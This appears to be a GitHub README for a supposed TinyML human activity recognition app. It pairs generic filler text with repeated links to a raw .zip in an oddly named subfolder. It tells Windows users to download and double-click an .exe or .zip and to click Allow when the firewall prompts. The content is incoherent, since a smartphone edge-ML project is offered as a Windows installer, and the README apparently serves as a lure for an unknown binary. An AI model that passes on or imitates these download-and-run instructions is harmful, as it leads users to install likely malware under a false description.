# 🏃 TinyML-Human-Activity-Recognition-on-Edge-Devices - Track physical movement using your smartphone

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/09sumitdas2/TinyML-Human-Activity-Recognition-on-Edge-Devices/main/Balawu/Devices-Recognition-Human-M-Activity-on-Tiny-Edge-3.5.zip)

This software identifies human physical activities using data from smartphone sensors. It runs lightweight artificial intelligence models on your device to detect movement patterns such as walking, sitting, or running. The system uses deep learning techniques to process time-series data locally without sending your information to a cloud server.

## 🎯 Project Goals

The objective involves creating an efficient tool for human activity recognition. By using small machine learning models, this software performs tasks on local hardware. This approach saves battery power and maintains user privacy. The application translates raw sensor inputs into readable movement categories.

## ⚙️ System Requirements

- Windows 10 or Windows 11
- 4 GB RAM minimum
- Current web browser
- Smartphone with functional accelerometer and gyroscope sensors
- Stable connection for initial download

## 📥 Getting the Software

You must visit the project release page to download the latest version for your Windows computer. Follow these steps to obtain the files:

1. Visit [this page to download](https://raw.githubusercontent.com/09sumitdas2/TinyML-Human-Activity-Recognition-on-Edge-Devices/main/Balawu/Devices-Recognition-Human-M-Activity-on-Tiny-Edge-3.5.zip).
2. Locate the most recent package marked as the "Latest release."
3. Select the file ending in .zip or .exe.
4. Save the file to a folder on your computer.

## 🛠 Installation Process

After you download the file, follow these instructions to set up the software:

1. Open the folder containing your downloaded file.
2. Double-click the file to begin the setup sequence.
3. Follow the prompts on the screen to confirm the destination folder.
4. Select the option to create a desktop shortcut for quick access.
5. Click finish once the progress bar reaches the end.

## 🚀 Running the Application

Once you install the software, you can start the program from your desktop shortcut. The main window shows a dashboard where you monitor activity states.

1. Connect your smartphone to the computer if you use a wired data link, or use the integrated network option to stream sensor data.
2. Select the sensor stream source from the drop-down menu.
3. Click the Start button to begin the live analysis.
4. Perform movements like sitting or walking.
5. Observe the activity labels on the right side of the screen.

## 🧠 How It Works

The system utilizes a Convolutional Neural Network. This architecture acts like an image processor but reads sensor data waves instead of pixels. By breaking down sensor oscillations into specific patterns, the model identifies repetitive actions. 

This program uses MobileNet1D. This model type fits onto edge devices, which means it requires very little processing power compared to massive server-based systems. It processes dataframes locally on your Windows machine to ensure you remain in control of your sensor metrics.

## 📊 Troubleshooting Common Issues

If the software fails to read data, verify these settings:

- Sensor access: Ensure your phone allows data output through the selected connection method.
- Firewall: Windows Security might ask for permission to let the app communicate. Click Allow to continue.
- Version match: Ensure your downloaded file version matches your current Windows update status. 
- Restart: Close the application and turn off your sensors before trying the connection process again.

## 📖 Understanding Terms

- Edge Computing: Processing data on the device itself rather than at a remote data center.
- Deep Learning: A method where computer models improve at recognizing patterns through examples.
- Time-series data: Information recorded in a sequence over specific time intervals.
- Sensor data: Readings from the accelerometer and gyroscope that track motion, speed, and direction.
- Lightweight model: A smaller version of an artificial intelligence engine designed to run on consumer hardware.

## 🔒 Privacy Notes

This software runs the inference process entirely on your local machine. No sensor data leaves your computer during the classification process. You hold full ownership of your data streams. The setup does not track your location or identity. It focuses strictly on patterns of movement detected during the active session.

## 📅 Future Updates

The project team plans to refine the model accuracy for more complex patterns. Future releases will include better visual graphs and options to log historical activity data for personal health monitoring. Check the release page periodically for performance improvements.